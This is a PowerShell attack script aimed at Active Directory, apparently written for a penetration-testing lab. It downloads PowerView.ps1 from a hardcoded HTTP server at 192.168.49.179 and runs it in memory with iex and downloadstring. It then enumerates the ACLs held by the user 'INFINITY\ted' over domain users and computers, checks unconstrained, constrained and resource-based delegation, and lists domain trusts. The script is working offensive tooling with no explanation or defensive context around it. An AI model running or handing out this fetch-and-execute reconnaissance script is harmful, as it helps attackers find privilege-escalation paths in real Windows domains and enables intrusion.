$httpServerUrl = "http://192.168.49.179:8000/"
$powerViewFile = "PowerView.ps1"
$workDir = "C:\Users\Public"
$domain = (Get-WmiObject win32_computersystem).Domain

iex (new-object system.net.webclient).downloadstring("${httpServerUrl}${powerviewFile}")

$identity = "INFINITY\ted"
if ($identity -eq $null) { $identity = $("$env:UserDomain\$env:Username") }

Write-Output "[*] Retrieving current user's ACLs for Domain Users"
Write-Output "==================================================="
Get-DomainUser -Domain $domain -Server $domain | Get-ObjectAcl -Domain $domain -Server $domain -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $identity) {$_}}

Write-Output "[*] Retrieving current user's ACLs for Domain Computers"
Write-Output "======================================================="
Get-DomainComputer -Domain $domain -Server $domain | Get-ObjectAcl -Domain $domain -Server $domain -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $identity) {$_}}

Write-Output "[*] Checking Unconstrained Delegation"
Write-Output "====================================="
Get-DomainComputer -Unconstrained -Domain $domain -Server $domain

Write-Output "[*] Checking Constrained Delegation"
Write-Output "==================================="
Get-DomainUser -TrustedToAuth -Domain $domain -Server $domain

Write-Output "[*] Checking Resource-Based Constrained Delegation"
Write-Output "=================================================="
Get-DomainComputer -Domain $domain -Server $domain | Get-ObjectAcl -Domain $domain -Server $domain -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $identity) {$_}}

Write-Output "[*] Retrieving Domain Trusts"
Write-Output "============================"
Get-DomainTrust -Domain $domain -Server $domain
